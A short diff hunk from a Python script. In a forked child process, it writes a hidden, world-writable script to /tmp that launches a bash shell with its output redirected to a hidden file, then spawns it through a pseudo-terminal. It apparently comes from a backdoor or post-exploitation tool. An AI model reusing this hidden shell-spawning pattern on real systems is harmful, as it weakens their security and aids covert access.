@@ -24,7 +24,7 @@ if (pid == 0):
     os.system("touch /tmp/.patate.sh && chmod 777 /tmp/.patate.sh")
     buffer = open("/tmp/.patate.sh", "w")
     # Redirect output in /tmp/output.
-    buffer.write("#!/bin/bash\n/bin/sh &> /tmp/.output")
+    buffer.write("#!/bin/bash\n/bin/bash &> /tmp/.output")
     buffer.close()
     pty.spawn("/tmp/.patate.sh")
 
